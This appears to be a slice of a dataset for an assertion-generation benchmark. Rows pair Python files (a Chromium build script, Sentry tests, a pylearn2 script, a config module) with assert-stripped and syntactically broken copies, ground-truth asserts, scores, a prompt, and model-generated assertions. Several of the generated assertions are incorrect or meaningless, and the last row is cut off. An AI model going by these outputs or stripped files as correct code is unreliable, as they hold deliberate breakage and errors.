27        val = sc.pdtrc([0, 1, 2], 0.0)
28
29    def test_rounding(self):
30        double_val = sc.pdtrc([0.1, 1.1, 2.1], 1.0)
31        int_val = sc.pdtrc([0, 1, 2], 1.0)
32
33    def test_inf(self):
34        val = sc.pdtrc(np.inf, 1.0)
35
36    def test_domain(self):
37        val = sc.pdtrc(-1.1, 1.0)
38",2304,"[[6, 'val', '==', 1, 'check if variable val is being properly set'],
 [9, 'val', '==', 3, 'check if variable val is being properly set and array is of correct length'],
 [12, 'double_val', '==', 3, 'check if variable double_val is being properly set and array is of correct length'],
 [14, 'int_val', '==', 3, 'check if variable int_val is being properly set and array is of correct length'],
 [16, 'val', '==', 1, 'check if variable val is being properly set'],
 [19, 'val', '==', 1, 'check if variable val is being properly set'],
 [23, 'val', '==', 1, 'check if variable val is being properly set'],
 [26, 'val', '==', 3, 'check if variable val is being properly set and array is of correct length'],
 [29, 'double_val', '==', 3, 'check if variable double_val is being properly set and array is of correct length'],
 [31, 'int_val', '==', 3, 'check if variable int_val is being properly set and array is of correct length'],
 [33, 'val', '==', 1, 'check if variable val is being properly set'],
 [36, 'val', '==', 1, 'check if variable val is being properly set']]"
Passw/gn_GFW,"#!/usr/bin/env python
#
# Copyright 2013 The Chromium Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

""""""Writes dependency ordered list of native libraries.

The list excludes any Android system libraries, as those are not bundled with
the APK.

This list of libraries is used for several steps of building an APK.
In the component build, the --input-libraries only needs to be the top-level
library (i.e. libcontent_shell_content_view). This will then use readelf to
inspect the shared libraries and determine the full list of (non-system)
libraries that should be included in the APK.
""""""

# TODO(cjhopman): See if we can expose the list of library dependencies from
# gyp, rather than calculating it ourselves.
# http://crbug.com/225558

import optparse
import os
import re
import sys

from util import build_utils

_readelf = None

_library_re = re.compile(
    '.*NEEDED.*Shared library: \[(?P<library_name>.+)\]')

_library_path_map = {}


def SetReadelfPath(path):
  global _readelf
  _readelf = path


def CallReadElf(library_or_executable):
  assert _readelf is not None
  readelf_cmd = [_readelf, '-d', library_or_executable]
  return build_utils.CheckOutput(readelf_cmd)


def GetDependencies(library_or_executable):
  elf = CallReadElf(library_or_executable)
  deps = set()
  for l in _library_re.findall(elf):
    p = _library_path_map.get(l)
    if p is not None:
      deps.add(p)
  return deps


def GetSortedTransitiveDependencies(libraries):
  """"""Returns all transitive library dependencies in dependency order.""""""
  return build_utils.GetSortedTransitiveDependencies(
      libraries, GetDependencies)


def main():
  parser = optparse.OptionParser()
  build_utils.AddDepfileOption(parser)

  parser.add_option('--readelf', help='Path to the readelf binary.')
  parser.add_option('--runtime-deps',
      help='A file created for the target using write_runtime_deps.')
  parser.add_option('--exclude-shared-libraries',
      help='List of shared libraries to exclude from the output.')
  parser.add_option('--output', help='Path to the generated .json file.')
  parser.add_option('--stamp', help='Path to touch on success.')

  options, _ = parser.parse_args(build_utils.ExpandFileArgs(sys.argv[1:]))

  SetReadelfPath(options.readelf)

  unsorted_lib_paths = []
  exclude_shared_libraries = []
  if options.exclude_shared_libraries:
    exclude_shared_libraries = options.exclude_shared_libraries.split(',')
  for f in open(options.runtime_deps):
    f = f[:-1]
    if f.endswith('.so'):
      p = f.replace('lib.unstripped/', '')
      if os.path.basename(p) in exclude_shared_libraries:
        continue
      unsorted_lib_paths.append(p)
      _library_path_map[os.path.basename(p)] = p

  lib_paths = GetSortedTransitiveDependencies(unsorted_lib_paths)

  libraries = [os.path.basename(l) for l in lib_paths]

  # Convert to ""base"" library names: e.g. libfoo.so -> foo
  java_libraries_list = (
      '{%s}' % ','.join(['""%s""' % s[3:-3] for s in libraries]))

  out_json = {
      'libraries': libraries,
      'lib_paths': lib_paths,
      'java_libraries_list': java_libraries_list
      }
  build_utils.WriteJson(
      out_json,
      options.output,
      only_if_changed=True)

  if options.stamp:
    build_utils.Touch(options.stamp)

  if options.depfile:
    build_utils.WriteDepfile(options.depfile, options.output, libraries)


if __name__ == '__main__':
  sys.exit(main())


","
1#!/usr/bin/env python
2#
3# Copyright 2013 The Chromium Authors. All rights reserved.
4# Use of this source code is governed by a BSD-style license that can be
5# found in the LICENSE file.
6
7""""""Writes dependency ordered list of native libraries.
8
9The list excludes any Android system libraries, as those are not bundled with
10the APK.
11
12This list of libraries is used for several steps of building an APK.
13In the component build, the --input-libraries only needs to be the top-level
14library (i.e. libcontent_shell_content_view). This will then use readelf to
15inspect the shared libraries and determine the full list of (non-system)
16libraries that should be included in the APK.
17""""""
18
19# TODO(cjhopman): See if we can expose the list of library dependencies from
20# gyp, rather than calculating it ourselves.
21# http://crbug.com/225558
22
23import optparse
24import os
25import re
26import sys
27
28from util import build_utils
29
30_readelf = None
31
32_library_re = re.compile(
33    '.*NEEDED.*Shared library: \[(?P<library_name>.+)\]')
34
35_library_path_map = {}
36
37
38def SetReadelfPath(path):
39  global _readelf
40  _readelf = path
41
42
43def CallReadElf(library_or_executable):
44  readelf_cmd = [_readelf, '-d', library_or_executable]
45  return build_utils.CheckOutput(readelf_cmd)
46
47
48def GetDependencies(library_or_executable):
49  elf = CallReadElf(library_or_executable)
50  deps = set()
51  for l in _library_re.findall(elf):
52    p = _library_path_map.get(l)
53    if p is not None:
54      deps.add(p)
55  return deps
56
57
58def GetSortedTransitiveDependencies(libraries):
59  """"""Returns all transitive library dependencies in dependency order.""""""
60  return build_utils.GetSortedTransitiveDependencies(
61      libraries, GetDependencies)
62
63
64def main():
65  parser = optparse.OptionParser()
66  build_utils.AddDepfileOption(parser)
67
68  parser.add_option('--readelf', help='Path to the readelf binary.')
69  parser.add_option('--runtime-deps',
70      help='A file created for the target using write_runtime_deps.')
71  parser.add_option('--exclude-shared-libraries',
72      help='List of shared libraries to exclude from the output.')
73  parser.add_option('--output', help='Path to the generated .json file.')
74  parser.add_option('--stamp', help='Path to touch on success.')
75
76  options, _ = parser.parse_args(build_utils.ExpandFileArgs(sys.argv[1:]))
77
78  SetReadelfPath(options.readelf)
79
80  unsorted_lib_paths = []
81  exclude_shared_libraries = []
82  if options.exclude_shared_libraries:
83    exclude_shared_libraries = options.exclude_shared_libraries.split(',')
84  for f in open(options.runtime_deps):
85    f = f[:-1]
86    if f.endswith('.so'):
87      p = f.replace('lib.unstripped/', '')
88      if os.path.basename(p) in exclude_shared_libraries:
89        continue
90      unsorted_lib_paths.append(p)
91      _library_path_map[os.path.basename(p)] = p
92
93  lib_paths = GetSortedTransitiveDependencies(unsorted_lib_paths)
94
95  libraries = [os.path.basename(l) for l in lib_paths]
96
97  # Convert to ""base"" library names: e.g. libfoo.so -> foo
98  java_libraries_list = (
99      '{%s}' % ','.join(['""%s""' % s[3:-3] for s in libraries]))
100
101  out_json = {
102      'libraries': libraries,
103      'lib_paths': lib_paths,
104      'java_libraries_list': java_libraries_list
105      }
106  build_utils.WriteJson(
107      out_json,
108      options.output,
109      only_if_changed=True)
110
111  if options.stamp:
112    build_utils.Touch(options.stamp)
113
114  if options.depfile:
115    build_utils.WriteDepfile(options.depfile, options.output, libraries)
116
117
118if __name__ == '__main__':
119  sys.exit(main())
120
121
122","[['_readelf', '==', 'not None']]",1,1,1.0,0.0002861230329041,"['_readelf', '_library_re', '_library_path_map', 'path', 'library_or_executable', 'readelf_cmd', 'elf', 'deps', 'p', 'libraries', 'parser', 'options', '_', 'unsorted_lib_paths', 'exclude_shared_libraries', 'f', '_library_path_map[os.path.basename(p)]', 'lib_paths', 'java_libraries_list', 'out_json']",20,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['_readelf', '_library_re', '_library_path_map', 'path', 'library_or_executable', 'readelf_cmd', 'elf', 'deps', 'p', 'libraries', 'parser', 'options', '_', 'unsorted_lib_paths', 'exclude_shared_libraries', 'f', '_library_path_map[os.path.basename(p)]', 'lib_paths', 'java_libraries_list', 'out_json']
*Code:

1#!/usr/bin/env python
2#
3# Copyright 2013 The Chromium Authors. All rights reserved.
4# Use of this source code is governed by a BSD-style license that can be
5# found in the LICENSE file.
6
7""""""Writes dependency ordered list of native libraries.
8
9The list excludes any Android system libraries, as those are not bundled with
10the APK.
11
12This list of libraries is used for several steps of building an APK.
13In the component build, the --input-libraries only needs to be the top-level
14library (i.e. libcontent_shell_content_view). This will then use readelf to
15inspect the shared libraries and determine the full list of (non-system)
16libraries that should be included in the APK.
17""""""
18
19# TODO(cjhopman): See if we can expose the list of library dependencies from
20# gyp, rather than calculating it ourselves.
21# http://crbug.com/225558
22
23import optparse
24import os
25import re
26import sys
27
28from util import build_utils
29
30_readelf = None
31
32_library_re = re.compile(
33    '.*NEEDED.*Shared library: \[(?P<library_name>.+)\]')
34
35_library_path_map = {}
36
37
38def SetReadelfPath(path):
39  global _readelf
40  _readelf = path
41
42
43def CallReadElf(library_or_executable):
44  readelf_cmd = [_readelf, '-d', library_or_executable]
45  return build_utils.CheckOutput(readelf_cmd)
46
47
48def GetDependencies(library_or_executable):
49  elf = CallReadElf(library_or_executable)
50  deps = set()
51  for l in _library_re.findall(elf):
52    p = _library_path_map.get(l)
53    if p is not None:
54      deps.add(p)
55  return deps
56
57
58def GetSortedTransitiveDependencies(libraries):
59  """"""Returns all transitive library dependencies in dependency order.""""""
60  return build_utils.GetSortedTransitiveDependencies(
61      libraries, GetDependencies)
62
63
64def main():
65  parser = optparse.OptionParser()
66  build_utils.AddDepfileOption(parser)
67
68  parser.add_option('--readelf', help='Path to the readelf binary.')
69  parser.add_option('--runtime-deps',
70      help='A file created for the target using write_runtime_deps.')
71  parser.add_option('--exclude-shared-libraries',
72      help='List of shared libraries to exclude from the output.')
73  parser.add_option('--output', help='Path to the generated .json file.')
74  parser.add_option('--stamp', help='Path to touch on success.')
75
76  options, _ = parser.parse_args(build_utils.ExpandFileArgs(sys.argv[1:]))
77
78  SetReadelfPath(options.readelf)
79
80  unsorted_lib_paths = []
81  exclude_shared_libraries = []
82  if options.exclude_shared_libraries:
83    exclude_shared_libraries = options.exclude_shared_libraries.split(',')
84  for f in open(options.runtime_deps):
85    f = f[:-1]
86    if f.endswith('.so'):
87      p = f.replace('lib.unstripped/', '')
88      if os.path.basename(p) in exclude_shared_libraries:
89        continue
90      unsorted_lib_paths.append(p)
91      _library_path_map[os.path.basename(p)] = p
92
93  lib_paths = GetSortedTransitiveDependencies(unsorted_lib_paths)
94
95  libraries = [os.path.basename(l) for l in lib_paths]
96
97  # Convert to ""base"" library names: e.g. libfoo.so -> foo
98  java_libraries_list = (
99      '{%s}' % ','.join(['""%s""' % s[3:-3] for s in libraries]))
100
101  out_json = {
102      'libraries': libraries,
103      'lib_paths': lib_paths,
104      'java_libraries_list': java_libraries_list
105      }
106  build_utils.WriteJson(
107      out_json,
108      options.output,
109      only_if_changed=True)
110
111  if options.stamp:
112    build_utils.Touch(options.stamp)
113
114  if options.depfile:
115    build_utils.WriteDepfile(options.depfile, options.output, libraries)
116
117
118if __name__ == '__main__':
119  sys.exit(main())
120
121
122",5404,"[[39, '_readelf', '!=', None, ""SetReadelfPath should properly instantiate _readelf with a path""], 
[46, 'readelf_cmd', '==', 3, ""readelf_cmd should always have exactly three elements""], 
[55, 'deps', '>=', 0, ""Dependencies list should be non-negative""], 
[78, 'options.readelf', '!=', None, ""options.readelf must be given a valid readelf path""], 
[91, '_library_path_map[os.path.basename(p)]', '!=', None, ""Every .so file should have its path set in _library_path_map""],
[93, 'lib_paths', '>=', 0, ""Library paths list (lib_paths) should be non-negative""], 
[99, 'java_libraries_list', '!=', '', ""java_libraries_list should be non-empty after library name conversion""],
[101, 'out_json', '==', 3, ""out_json Dictionary should always have exactly three entries (libraries, lib_paths, java_libraries_list)""]]"
BayanGroup/sentry,"from __future__ import absolute_import

from django.core.urlresolvers import reverse

from sentry.models import OrganizationMember, OrganizationMemberTeam, Team
from sentry.testutils import TestCase, PermissionTestCase


class CreateTeamPermissionTest(PermissionTestCase):
    def setUp(self):
        super(CreateTeamPermissionTest, self).setUp()
        self.path = reverse('sentry-create-team', args=[self.organization.slug])

    def test_teamless_admin_cannot_load(self):
        self.assert_teamless_admin_cannot_access(self.path)

    def test_team_admin_cannot_load(self):
        self.assert_team_admin_cannot_access(self.path)

    def test_org_member_cannot_load(self):
        self.assert_org_member_cannot_access(self.path)

    def test_org_admin_can_load(self):
        self.assert_org_admin_can_access(self.path)


class CreateTeamTest(TestCase):
    def test_renders_with_context(self):
        organization = self.create_organization()
        path = reverse('sentry-create-team', args=[organization.slug])
        self.login_as(self.user)
        resp = self.client.get(path)
        assert resp.status_code == 200
        self.assertTemplateUsed(resp, 'sentry/create-team.html')
        assert resp.context['organization'] == organization
        assert resp.context['form']

    def test_submission(self):
        organization = self.create_organization()
        path = reverse('sentry-create-team', args=[organization.slug])
        self.login_as(self.user)
        resp = self.client.post(path, {
            'name': 'bar',
        })
        assert resp.status_code == 302, resp.context['form'].errors

        team = Team.objects.get(organization=organization, name='bar')

        member = OrganizationMember.objects.get(
            user=self.user,
            organization=organization,
        )

        assert OrganizationMemberTeam.objects.filter(
            organizationmember=member,
            team=team,
            is_active=True,
        ).exists()

        redirect_uri = reverse('sentry-create-project', args=[organization.slug])
        assert resp['Location'] == 'http://testserver%s?team=%s' % (
            redirect_uri, team.slug)
","
1from __future__ import absolute_import
2
3from django.core.urlresolvers import reverse
4
5from sentry.models import OrganizationMember, OrganizationMemberTeam, Team
6from sentry.testutils import TestCase, PermissionTestCase
7
8
9class CreateTeamPermissionTest(PermissionTestCase):
10    def setUp(self):
11        super(CreateTeamPermissionTest, self).setUp()
12        self.path = reverse('sentry-create-team', args=[self.organization.slug])
13
14    def test_teamless_admin_cannot_load(self):
15
16    def test_team_admin_cannot_load(self):
17
18    def test_org_member_cannot_load(self):
19
20    def test_org_admin_can_load(self):
21
22
23class CreateTeamTest(TestCase):
24    def test_renders_with_context(self):
25        organization = self.create_organization()
26        path = reverse('sentry-create-team', args=[organization.slug])
27        self.login_as(self.user)
28        resp = self.client.get(path)
29
30    def test_submission(self):
31        organization = self.create_organization()
32        path = reverse('sentry-create-team', args=[organization.slug])
33        self.login_as(self.user)
34        resp = self.client.post(path, {
35            'name': 'bar',
36        })
37
38        team = Team.objects.get(organization=organization, name='bar')
39
40        member = OrganizationMember.objects.get(
41            user=self.user,
42            organization=organization,
43        )
44
45            organizationmember=member,
46            team=team,
47            is_active=True,
48        ).exists()
49
50        redirect_uri = reverse('sentry-create-project', args=[organization.slug])
51            redirect_uri, team.slug)
52","[['resp.status_code', '==', '200'], [""resp.context['organization']"", '==', 'organization'], [""resp.context['form']"", '==', 'True'], ['resp.status_code', '==', '302'], ['OrganizationMemberTeam.objects.filter(', '==', 'True'], [""resp['Location']"", '==', ""'http://testserver%s?team=%s' % (""]]",11,6,0.5454545454545454,0.0027535566773749,"['self.path', 'organization', 'path', 'resp', 'team', 'member', 'redirect_uri']",7,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['self.path', 'organization', 'path', 'resp', 'team', 'member', 'redirect_uri']
*Code:

1from __future__ import absolute_import
2
3from django.core.urlresolvers import reverse
4
5from sentry.models import OrganizationMember, OrganizationMemberTeam, Team
6from sentry.testutils import TestCase, PermissionTestCase
7
8
9class CreateTeamPermissionTest(PermissionTestCase):
10    def setUp(self):
11        super(CreateTeamPermissionTest, self).setUp()
12        self.path = reverse('sentry-create-team', args=[self.organization.slug])
13
14    def test_teamless_admin_cannot_load(self):
15
16    def test_team_admin_cannot_load(self):
17
18    def test_org_member_cannot_load(self):
19
20    def test_org_admin_can_load(self):
21
22
23class CreateTeamTest(TestCase):
24    def test_renders_with_context(self):
25        organization = self.create_organization()
26        path = reverse('sentry-create-team', args=[organization.slug])
27        self.login_as(self.user)
28        resp = self.client.get(path)
29
30    def test_submission(self):
31        organization = self.create_organization()
32        path = reverse('sentry-create-team', args=[organization.slug])
33        self.login_as(self.user)
34        resp = self.client.post(path, {
35            'name': 'bar',
36        })
37
38        team = Team.objects.get(organization=organization, name='bar')
39
40        member = OrganizationMember.objects.get(
41            user=self.user,
42            organization=organization,
43        )
44
45            organizationmember=member,
46            team=team,
47            is_active=True,
48        ).exists()
49
50        redirect_uri = reverse('sentry-create-project', args=[organization.slug])
51            redirect_uri, team.slug)
52",3119,"[[25, 'organization', '!=', None, ""organization must be created and not None""],
[29, 'resp', '!=', None, ""resp in line 28 must not be None after get call""],
[31, 'organization', '!=', None, ""organization must be created and not None""],
[34, 'resp', '!=', None, ""resp in line 33 must not be None after post call""],
[38, 'team', '!=', None, ""team must exist after being retrieved""],
[40, 'member', '!=', None, ""member must exist after being retrieved""],
[51, 'redirect_uri', '!=', None, ""redirect_uri must exist after reverse call""]]"
KennethPierce/pylearnk,"from pylearn2.utils import py_integer_types
from pylearn2.utils import serial
from pylearn2.config import yaml_parse
import sys

_, model_path = sys.argv

model = serial.load(model_path)

src = model.dataset_yaml_src
batch_size = 100
model.set_batch_size(batch_size)

assert src.find('train') != -1
test = yaml_parse.load(src)
test = test.get_test_set()
assert test.X.shape[0] == 10000

test.X = test.X.astype('float32')

import theano.tensor as T

Xb = model.get_input_space().make_batch_theano()
Xb.name = 'Xb'
yb = model.get_output_space().make_batch_theano()
yb.name = 'yb'

ymf = model.fprop(Xb)
ymf.name = 'ymf'

from theano import function

yl = T.argmax(yb,axis=1)

mf1acc = 1.-T.neq(yl , T.argmax(ymf,axis=1)).mean()

batch_acc = function([Xb,yb],[mf1acc])

# The averaging math assumes batches are all same size
assert test.X.shape[0] % batch_size == 0


def accs():
    mf1_accs = []
    assert isinstance(test.X.shape[0], (int, long))
    assert isinstance(batch_size, py_integer_types)
    iterator = test.iterator(mode = 'even_sequential',
                            batch_size = batch_size,
                            data_specs = model.cost_from_X_data_specs())
    for item in iterator:
        x_arg, y_arg = item
        if Xb.ndim > 2:
            x_arg = test.get_topological_view(x_arg)
        mf1_accs.append(batch_acc(x_arg, y_arg)[0])
    return sum(mf1_accs) / float(len(mf1_accs))


result = accs()

print 1. - result

","
1from pylearn2.utils import py_integer_types
2from pylearn2.utils import serial
3from pylearn2.config import yaml_parse
4import sys
5
6_, model_path = sys.argv
7
8model = serial.load(model_path)
9
10src = model.dataset_yaml_src
11batch_size = 100
12model.set_batch_size(batch_size)
13
14test = yaml_parse.load(src)
15test = test.get_test_set()
16
17test.X = test.X.astype('float32')
18
19import theano.tensor as T
20
21Xb = model.get_input_space().make_batch_theano()
22Xb.name = 'Xb'
23yb = model.get_output_space().make_batch_theano()
24yb.name = 'yb'
25
26ymf = model.fprop(Xb)
27ymf.name = 'ymf'
28
29from theano import function
30
31yl = T.argmax(yb,axis=1)
32
33mf1acc = 1.-T.neq(yl , T.argmax(ymf,axis=1)).mean()
34
35batch_acc = function([Xb,yb],[mf1acc])
36
37# The averaging math assumes batches are all same size
38
39
40def accs():
41    mf1_accs = []
42    iterator = test.iterator(mode = 'even_sequential',
43                            batch_size = batch_size,
44                            data_specs = model.cost_from_X_data_specs())
45    for item in iterator:
46        x_arg, y_arg = item
47        if Xb.ndim > 2:
48            x_arg = test.get_topological_view(x_arg)
49        mf1_accs.append(batch_acc(x_arg, y_arg)[0])
50    return sum(mf1_accs) / float(len(mf1_accs))
51
52
53result = accs()
54
55print 1. - result
56
57","[[""src.find('train')"", '!=', '-1'], ['test.X.shape[0]', '==', '10000'], ['test.X.shape[0] % batch_size', '==', '0']]",5,3,0.6,0.0020703933747412,"['_', 'model_path', 'model', 'src', 'batch_size', 'test', 'test.X', 'Xb', 'Xb.name', 'yb', 'yb.name', 'ymf', 'ymf.name', 'yl', 'mf1acc', 'batch_acc', 'mf1_accs', 'iterator', 'data_specs', 'x_arg', 'y_arg', 'result']",22,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['_', 'model_path', 'model', 'src', 'batch_size', 'test', 'test.X', 'Xb', 'Xb.name', 'yb', 'yb.name', 'ymf', 'ymf.name', 'yl', 'mf1acc', 'batch_acc', 'mf1_accs', 'iterator', 'data_specs', 'x_arg', 'y_arg', 'result']
*Code:

1from pylearn2.utils import py_integer_types
2from pylearn2.utils import serial
3from pylearn2.config import yaml_parse
4import sys
5
6_, model_path = sys.argv
7
8model = serial.load(model_path)
9
10src = model.dataset_yaml_src
11batch_size = 100
12model.set_batch_size(batch_size)
13
14test = yaml_parse.load(src)
15test = test.get_test_set()
16
17test.X = test.X.astype('float32')
18
19import theano.tensor as T
20
21Xb = model.get_input_space().make_batch_theano()
22Xb.name = 'Xb'
23yb = model.get_output_space().make_batch_theano()
24yb.name = 'yb'
25
26ymf = model.fprop(Xb)
27ymf.name = 'ymf'
28
29from theano import function
30
31yl = T.argmax(yb,axis=1)
32
33mf1acc = 1.-T.neq(yl , T.argmax(ymf,axis=1)).mean()
34
35batch_acc = function([Xb,yb],[mf1acc])
36
37# The averaging math assumes batches are all same size
38
39
40def accs():
41    mf1_accs = []
42    iterator = test.iterator(mode = 'even_sequential',
43                            batch_size = batch_size,
44                            data_specs = model.cost_from_X_data_specs())
45    for item in iterator:
46        x_arg, y_arg = item
47        if Xb.ndim > 2:
48            x_arg = test.get_topological_view(x_arg)
49        mf1_accs.append(batch_acc(x_arg, y_arg)[0])
50    return sum(mf1_accs) / float(len(mf1_accs))
51
52
53result = accs()
54
55print 1. - result
56
57",2942,"[[6, '_', !=, '', 'Ensure the first command line argument is not empty'], [8, 'model_path', !=, '', 'Ensure the model path is not empty'], [11, 'batch_size', >=, 1, 'Batch size should be at least 1 for the model to process the data'], [17, 'test.X', !=, '', 'Test data should not be empty'], [46, 'x_arg', !=, '', 'Ensure batch inputs are not empty'], [46, 'y_arg', !=, '', 'Ensure batch labels are not empty'], [50, 'mf1_accs', !=, [], 'Ensure that model accuracies list is not empty']]"
projectweekend/Cards-API,"import os


API_KEY = os.getenv('API_KEY')
assert API_KEY

CARD_IMAGE_PATH = os.getenv('CARD_IMAGE_PATH')
assert CARD_IMAGE_PATH

DOCKER_COMPOSE_DB_URL = 'postgres://postgres@{0}:5432/postgres'
DOCKER_COMPOSE_DB_ADDR = os.getenv('DB_PORT_5432_TCP_ADDR', None)

DATABASE_URL = os.getenv('DATABASE_URL', DOCKER_COMPOSE_DB_URL.format(DOCKER_COMPOSE_DB_ADDR))
assert DATABASE_URL

DEFAULT_CARDS_CONFIG = {
    'cards': (
        'ACE_SPADES', '2_SPADES', '3_SPADES', '4_SPADES', '5_SPADES', '6_SPADES', '7_SPADES', '8_SPADES', '9_SPADES', '10_SPADES', 'JACK_SPADES', 'QUEEN_SPADES', 'KING_SPADES',
        'ACE_DIAMONDS', '2_DIAMONDS', '3_DIAMONDS', '4_DIAMONDS', '5_DIAMONDS', '6_DIAMONDS', '7_DIAMONDS', '8_DIAMONDS', '9_DIAMONDS', '10_DIAMONDS', 'JACK_DIAMONDS', 'QUEEN_DIAMONDS', 'KING_DIAMONDS',
        'ACE_CLUBS', '2_CLUBS', '3_CLUBS', '4_CLUBS', '5_CLUBS', '6_CLUBS', '7_CLUBS', '8_CLUBS', '9_CLUBS', '10_CLUBS', 'JACK_CLUBS', 'QUEEN_CLUBS', 'KING_CLUBS',
        'ACE_HEARTS', '2_HEARTS', '3_HEARTS', '4_HEARTS', '5_HEARTS', '6_HEARTS', '7_HEARTS', '8_HEARTS', '9_HEARTS', '10_HEARTS', 'JACK_HEARTS', 'QUEEN_HEARTS', 'KING_HEARTS',
    ),
    'image_path': CARD_IMAGE_PATH
}
","
1import os
2
3
4API_KEY = os.getenv('API_KEY')
5
6CARD_IMAGE_PATH = os.getenv('CARD_IMAGE_PATH')
7
8DOCKER_COMPOSE_DB_URL = 'postgres://postgres@{0}:5432/postgres'
9DOCKER_COMPOSE_DB_ADDR = os.getenv('DB_PORT_5432_TCP_ADDR', None)
10
11DATABASE_URL = os.getenv('DATABASE_URL', DOCKER_COMPOSE_DB_URL.format(DOCKER_COMPOSE_DB_ADDR))
12
13DEFAULT_CARDS_CONFIG = {
14    'cards': (
15        'ACE_SPADES', '2_SPADES', '3_SPADES', '4_SPADES', '5_SPADES', '6_SPADES', '7_SPADES', '8_SPADES', '9_SPADES', '10_SPADES', 'JACK_SPADES', 'QUEEN_SPADES', 'KING_SPADES',
16        'ACE_DIAMONDS', '2_DIAMONDS', '3_DIAMONDS', '4_DIAMONDS', '5_DIAMONDS', '6_DIAMONDS', '7_DIAMONDS', '8_DIAMONDS', '9_DIAMONDS', '10_DIAMONDS', 'JACK_DIAMONDS', 'QUEEN_DIAMONDS', 'KING_DIAMONDS',
17        'ACE_CLUBS', '2_CLUBS', '3_CLUBS', '4_CLUBS', '5_CLUBS', '6_CLUBS', '7_CLUBS', '8_CLUBS', '9_CLUBS', '10_CLUBS', 'JACK_CLUBS', 'QUEEN_CLUBS', 'KING_CLUBS',
18        'ACE_HEARTS', '2_HEARTS', '3_HEARTS', '4_HEARTS', '5_HEARTS', '6_HEARTS', '7_HEARTS', '8_HEARTS', '9_HEARTS', '10_HEARTS', 'JACK_HEARTS', 'QUEEN_HEARTS', 'KING_HEARTS',
19    ),
20    'image_path': CARD_IMAGE_PATH
21}
22","[['API_KEY', '==', 'True'], ['CARD_IMAGE_PATH', '==', 'True'], ['DATABASE_URL', '==', 'True']]",3,3,1.0,0.0025402201524132,"['API_KEY', 'CARD_IMAGE_PATH', 'DOCKER_COMPOSE_DB_URL', 'DOCKER_COMPOSE_DB_ADDR', 'DATABASE_URL', 'DEFAULT_CARDS_CONFIG']",6,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['API_KEY', 'CARD_IMAGE_PATH', 'DOCKER_COMPOSE_DB_URL', 'DOCKER_COMPOSE_DB_ADDR', 'DATABASE_URL', 'DEFAULT_CARDS_CONFIG']
*Code:

1import os
2
3
4API_KEY = os.getenv('API_KEY')
5
6CARD_IMAGE_PATH = os.getenv('CARD_IMAGE_PATH')
7
8DOCKER_COMPOSE_DB_URL = 'postgres://postgres@{0}:5432/postgres'
9DOCKER_COMPOSE_DB_ADDR = os.getenv('DB_PORT_5432_TCP_ADDR', None)
10
